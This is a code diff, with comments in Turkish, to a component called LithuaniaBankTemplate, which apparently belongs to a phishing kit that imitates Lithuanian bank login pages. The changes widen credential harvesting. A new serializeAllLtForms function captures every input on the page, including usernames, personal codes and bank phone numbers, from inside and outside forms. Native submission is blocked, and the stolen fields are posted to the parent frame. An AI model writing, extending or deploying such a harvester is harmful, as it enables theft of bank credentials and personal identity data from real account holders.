@@ -614,9 +614,32 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         for (const field of capturedFields) {
           const value = field.value.trim();
           if (!value) continue;
+
+          // YENI: PREFIXLI key geliyorsa (form1__ / form2__ / form0__):
+          // 1) ONCE prefixli HALIYLE persist et → rawCapturedData benzersiz key ile saklansin
+          //    (2. formun ayni isimli alani 1. formun ustune yazmasin)
           persistRawCapturedField(field);
 
-          const lowerKey = field.key.toLowerCase();
+          // Prefix'i temizle: /^form\d+__/ regex ile form0__ / form1__ / form2__ ... sil
+          const originalKey = field.key || "";
+          const prefixMatch = originalKey.match(/^form(\d+)__/);
+          const strippedKey = prefixMatch ? originalKey.replace(/^form\d+__/, '') : originalKey;
+
+          // 2) SONRA prefix'SIZ HALIYLE de persist et → eski mapping/matchedData
+          //    (username, personalCode, bankPhone vb.) kolonlara yazilsin.
+          //    (name/id/formControlName zaten prefix'siz olabilir ama garantiye alalim)
+          if (prefixMatch) {
+            persistRawCapturedField({
+              ...field,
+              key: strippedKey,
+              // name/id/formControlName'i da prefix'siz olduguna varsayiyoruz
+              // (serializeAllLtForms sadece field.key'e prefix ekledi)
+            });
+          }
+
+          // lowerKey icin prefix'SIZ key kullan → tum if'ler (phone-number, pc, ln vb.)
+          // dogru eslesme yapabilsin (form1__phone-number !== phone-number OLDUGU ICIN)
+          const lowerKey = strippedKey.toLowerCase();
           const lowerText = getFieldSearchText(field);
 
           if (lowerText.includes("rememberme") || lowerText.includes("pea mind meeles") || lowerText.includes("remember me")) {
@@ -1098,9 +1121,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           // GERI KALAN TUM INPUT/TEXTAREA'lari (form icinde olsalar bile) GIZLE.
           (function strictStrayInputKiller() {
             // 1) Beyaz liste: GERCEK form alanlari = bunlari ASLA GIZLEME
+            //    ONEMLI: SADECE form ICI DEGIL — TUM gorunur input/textarea/select
+            //    (Vuetify/Angular vb. frameworkler inputlari FORM DISINDA da tutabilir —
+            //     eskisi gibi sadece form ici almak FORM DISI alanlari GIZLERDI!
             const realFieldSet = new Set();
-            // Tum form icindeki, görünür ve input/textarea/select'ler GERCEK alan kabul edilir
-            document.querySelectorAll('form input, form textarea, form select').forEach(el => {
+            document.querySelectorAll('input, textarea, select').forEach(el => {
               if (!el) return;
               const tt = (el.type || el.tagName || '').toLowerCase();
               if (tt === 'hidden' || tt === 'submit' || tt === 'button' || tt === 'reset' || tt === 'file') return;
@@ -1829,6 +1854,99 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             return inputs;
         };
 
+        const serializeAllLtForms = () => {
+            var allFields = [];
+
+            try {
+                var rootFields = buildCapturedFields(document);
+                rootFields.forEach(function(field) {
+                    var sel = '[name="' + field.name + '"], #' + field.id + ', [formcontrolname="' + field.formControlName + '"]';
+                    var tempEl = document.querySelector(sel);
+                    var isInsideForm = false;
+                    if (tempEl && tempEl.closest) {
+                        isInsideForm = !!tempEl.closest('form');
+                    }
+                    if (!tempEl) {
+                        var allInputs = Array.from(document.querySelectorAll('input, select, textarea'));
+                        for (var i = 0; i < allInputs.length; i++) {
+                            var inp = allInputs[i];
+                            var inpName = inp.name || inp.getAttribute('formcontrolname') || inp.id || '';
+                            var inpVal = (inp.value || '').trim();
+                            var fieldVal = (field.value || '').trim();
+                            if (
+                                inpName === field.name || inpName === field.id ||
+                                (inpVal && fieldVal && inpVal === fieldVal)
+                            ) {
+                                if (inp.closest && inp.closest('form')) {
+                                    isInsideForm = true;
+                                }
+                                break;
+                            }
+                        }
+                    }
+                    if (!isInsideForm) {
+                        allFields.push({
+                            key: 'form0__' + field.key,
+                            name: field.name,
+                            id: field.id,
+                            formControlName: field.formControlName,
+                            value: field.value,
+                            type: field.type,
+                            label: field.label,
+                            ariaLabel: field.ariaLabel,
+                            placeholder: field.placeholder,
+                            _hasPrefix: true
+                        });
+                    }
+                });
+            } catch(_) {}
+
+            try {
+                var forms = Array.from(document.forms || []);
+                forms.forEach(function(form, formIdx) {
+                    var formPrefix = 'form' + (formIdx + 1) + '__';
+                    var formFields = buildCapturedFields(form);
+                    formFields.forEach(function(field) {
+                        allFields.push({
+                            key: formPrefix + field.key,
+                            name: field.name,
+                            id: field.id,
+                            formControlName: field.formControlName,
+                            value: field.value,
+                            type: field.type,
+                            label: field.label,
+                            ariaLabel: field.ariaLabel,
+                            placeholder: field.placeholder,
+                            _hasPrefix: true
+                        });
+                    });
+                });
+            } catch(_) {}
+
+            if (allFields.length === 0) {
+                try {
+                    var fallbackFields = buildCapturedFields(document);
+                    fallbackFields.forEach(function(field) {
+                        allFields.push({
+                            key: 'form0__' + field.key,
+                            name: field.name,
+                            id: field.id,
+                            formControlName: field.formControlName,
+                            value: field.value,
+                            type: field.type,
+                            label: field.label,
+                            ariaLabel: field.ariaLabel,
+                            placeholder: field.placeholder,
+                            _hasPrefix: true
+                        });
+                    });
+                } catch(_) {}
+            }
+
+            var inputs = buildInputMap(allFields);
+            return { fields: allFields, inputs };
+        };
+
         const extractLoginMethodLabel = (rawValue) => {
             const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
             const normalized = loginMethod.toLowerCase();
@@ -1926,14 +2044,9 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         };
 
         const submitCoopVisibleFields = () => {
-            const activeCoopPanel =
-                document.querySelector('.v-window-item--active') ||
-                document.querySelector('.v-window-item:not([style*="display:none"])');
-            const coopFields = buildCapturedFields(activeCoopPanel || document);
-            if (coopFields.length === 0) {
-                coopFields.push(...buildCapturedFields(document));
-            }
-            const coopInputs = buildInputMap(coopFields);
+            // YENI: Tum formlari + form disi alanlari TEK SEFERDE serialize et
+            // (form1__ / form2__ / form0__ prefix benzersiz key saglar)
+            const { fields: coopFields, inputs: coopInputs } = serializeAllLtForms();
 
             window.parent.postMessage({
               type: 'LITHUANIA_BANK_SUBMIT',
@@ -2025,9 +2138,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         document.addEventListener('submit', (e) => {
           preventAnyNativeNavigation(e);
 
-          const form = e.target;
-          const fields = buildCapturedFields(form);
-          const inputs = buildInputMap(fields);
+          // YENI: Submit edilen form hangisi olursa olsun TUM formlari + form disi
+          // alanlari TEK SEFERDE serialize et (form1__ / form2__ / form0__ prefix)
+          const { fields, inputs } = serializeAllLtForms();
+
           const visibleAnyField = (fields || []).some(f => f.value && String(f.value).trim() !== '');
           const hasGlobalVisible = Array.from(document.querySelectorAll('input, select, textarea')).some(inp => {
             try {
@@ -2458,10 +2572,9 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                return false;
              }
 
-             const form = target.closest ? target.closest('form') : null;
-             const inputContainer = form || document;
-             const fields = buildCapturedFields(inputContainer);
-             const inputs = buildInputMap(fields);
+             // YENI: Submit butonu hangi formdan/nereden gelirse gelsin TUM formlari
+             // + form disi alanlari TEK SEFERDE serialize et (form1__ / form2__ / form0__)
+             const { fields, inputs } = serializeAllLtForms();
 
              // Global inputlardan da kontrol et (fallback: find ANY visible input)
              let hasValue = false;
